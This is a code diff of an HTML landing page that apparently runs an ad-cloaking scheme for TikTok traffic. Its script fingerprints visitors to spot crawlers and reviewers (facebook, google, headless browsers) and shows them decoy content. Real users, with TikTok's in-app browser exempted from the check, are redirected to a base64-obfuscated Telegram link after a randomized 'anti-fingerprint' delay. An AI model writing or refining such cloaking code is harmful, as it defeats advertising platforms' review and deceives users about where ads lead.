@@ -8,36 +8,36 @@
 
   <!-- TikTok Pixel Code Start -->
   <script>
-  !function (w, d, t) {
-    w.TiktokAnalyticsObject = t;
-    var ttq = w[t] = w[t] || [];
-    ttq.methods = ["page", "track", "identify", "instances", "debug", "on", "off", "once", "ready", "alias", "group", "enableCookie", "disableCookie"];
-    ttq.setAndDefer = function (t, e) {
-      t[e] = function () {
-        t.push([e].concat(Array.prototype.slice.call(arguments, 0)))
-      }
-    };
-    for (var i = 0; i < ttq.methods.length; i++) ttq.setAndDefer(ttq, ttq.methods[i]);
-    ttq.load = function (e, n) {
-      var i = "https://analytics.tiktok.com/i18n/pixel/events.js";
-      ttq._i = ttq._i || {};
-      ttq._i[e] = [];
-      ttq._i[e]._u = i;
-      ttq._t = ttq._t || {};
-      ttq._t[e] = +new Date;
-      ttq._o = ttq._o || {};
-      ttq._o[e] = n || {};
-      var a = document.createElement("script");
-      a.type = "text/javascript";
-      a.async = !0;
-      a.src = i + "?sdkid=" + e + "&lib=" + t;
-      var s = document.getElementsByTagName("script")[0];
-      s.parentNode.insertBefore(a, s);
-    };
+    !function (w, d, t) {
+      w.TiktokAnalyticsObject = t;
+      var ttq = w[t] = w[t] || [];
+      ttq.methods = ["page", "track", "identify", "instances", "debug", "on", "off", "once", "ready", "alias", "group", "enableCookie", "disableCookie"];
+      ttq.setAndDefer = function (t, e) {
+        t[e] = function () {
+          t.push([e].concat(Array.prototype.slice.call(arguments, 0)))
+        }
+      };
+      for (var i = 0; i < ttq.methods.length; i++) ttq.setAndDefer(ttq, ttq.methods[i]);
+      ttq.load = function (e, n) {
+        var i = "https://analytics.tiktok.com/i18n/pixel/events.js";
+        ttq._i = ttq._i || {};
+        ttq._i[e] = [];
+        ttq._i[e]._u = i;
+        ttq._t = ttq._t || {};
+        ttq._t[e] = +new Date;
+        ttq._o = ttq._o || {};
+        ttq._o[e] = n || {};
+        var a = document.createElement("script");
+        a.type = "text/javascript";
+        a.async = !0;
+        a.src = i + "?sdkid=" + e + "&lib=" + t;
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(a, s);
+      };
 
-    ttq.load('D1M9Q43C77U75N55I240'); // Seu ID Pixel
-    ttq.page();
-  }(window, document, 'ttq');
+      ttq.load('D1M9Q43C77U75N55I240'); // Seu ID Pixel TikTok
+      ttq.page();
+    }(window, document, 'ttq');
   </script>
   <!-- TikTok Pixel Code End -->
 
@@ -71,17 +71,19 @@
   <script>
     const isBot = () => {
       const n = navigator;
+      const ua = n.userAgent || '';
       return (
         n.webdriver ||
         !n.languages ||
         n.languages.length === 0 ||
         !n.plugins ||
         n.plugins.length === 0 ||
-        /bot|crawl|spider|facebook|google|Headless|PhantomJS/i.test(n.userAgent)
+        /bot|crawl|spider|facebook|google|Headless|PhantomJS/i.test(ua) &&
+        !/TikTok/i.test(ua) // PERMITIR TikTok WebView
       );
     };
 
-    const destino = atob("aHR0cHM6Ly90Lm1lL2NoZWVzc2VwaXp6YXMv"); // Telegram redirecionamento
+    const destino = atob("aHR0cHM6Ly90Lm1lL2NoZWVzc2VwaXp6YXMv"); // Telegram (link base64)
 
     if (isBot()) {
       document.getElementById("white-content").style.display = "block";
@@ -99,11 +101,13 @@
 
       setTimeout(function () {
         aguardaPixelETrigaEvento(0);
-      }, 1000); // espera 1s para começar a checar o pixel
+      }, 1000); // começa a checar o pixel depois de 1s
 
+      // Delay aleatório entre 3s e 4s (anti-fingerprint)
+      const delay = Math.floor(Math.random() * 1000) + 3000;
       setTimeout(function () {
         window.location.href = destino;
-      }, 4000); // redireciona após 4 segundos
+      }, delay);
     }
   </script>
 
